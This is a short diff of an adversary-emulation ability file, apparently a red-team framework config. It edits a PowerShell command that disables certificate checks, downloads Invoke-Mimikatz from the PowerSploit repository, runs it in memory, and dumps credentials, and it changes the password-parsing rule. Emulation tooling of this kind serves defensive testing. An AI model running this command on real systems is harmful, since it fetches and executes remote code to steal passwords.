@@ -10,11 +10,11 @@
   executors:
     windows:
       command: |
-        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
-        $web = (New-Object System.Net.WebClient)
-        $result = $web.DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1")
-        iex $result; Invoke-Mimikatz -DumpCreds
+        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };
+        $web = (New-Object System.Net.WebClient);
+        $result = $web.DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1");
+        iex $result; Invoke-Mimikatz -DumpCreds;
       parser:
-        name: regex
+        name: parse_mimikatz
         property: host.user.password
         script: 'Password\s:\s(.*)'
